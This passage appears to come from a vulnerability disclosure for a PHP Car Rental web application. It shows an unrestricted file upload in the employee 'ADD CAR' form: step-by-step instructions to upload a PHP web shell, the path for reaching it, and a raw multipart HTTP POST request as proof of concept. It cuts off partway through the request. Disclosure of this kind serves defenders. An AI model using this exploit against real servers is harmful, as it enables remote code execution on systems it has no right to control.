...
* `Note` => Login to `Employee`
* Description Upload web shell at `ADD CAR`
# Exploit 
* Login to `Employee` -> `CONTROL PANEL` -> `ADD CAR`
![image](https://user-images.githubusercontent.com/79050415/159734496-6a1a643d-50b3-468a-b3f8-e61929c3e93e.png)
* Upload web shell `lmao.php`
![image](https://user-images.githubusercontent.com/79050415/159735575-e7ddd000-c792-49a9-a345-f050f596aff1.png)
* When upload web shell success access `/assets/img/cars/lmao.php`
![image](https://user-images.githubusercontent.com/79050415/159736041-6b4302be-1b19-4be7-b8ba-eadb9783e9db.png)
* Web shell actived
![image](https://user-images.githubusercontent.com/79050415/159736186-c6b07e3c-1ed9-4617-b56d-79ef74713a56.png)
# Vulnerable Code
![image](https://user-images.githubusercontent.com/79050415/159736469-66310204-d223-4f88-99ba-eb80c4f97e0b.png)
* No file checking before uploading
# POC 
* `Injection Point`
```python
------WebKitFormBoundary9VkT3muEHK2MuAAN
Content-Disposition: form-data; name="uploadedimage"; filename="lmao.php"
Content-Type: application/octet-stream
```
* `Request`
```python
POST /Car_Rental/entercar1.php HTTP/1.1
Host: 192.168.1.101:8080
Content-Length: 179397
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.101:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9VkT3muEHK2MuAAN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.101:8080/Car_Rental/entercar.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=5cddkjjvh5nhvqh96t306gau8b
Connection: close
...
audi
------WebKitFormBoundary9VkT3muEHK2MuAAN
Content-Disposition: form-data; name="car_nameplate"

1
------WebKitFormBoundary9VkT3muEHK2MuAAN
Content-Disposition: form-data; name="ac_price"

1
------WebKitFormBoundary9VkT3muEHK2MuAAN
Content-Disposition: form-data; name="non_ac_price"

1
------WebKitFormBoundary9VkT3muEHK2MuAAN
Content-Disposition: form-data; name="ac_price_per_day"

1
------WebKitFormBoundary9VkT3muEHK2MuAAN
Content-Disposition: form-data; name="non_ac_price_per_day"
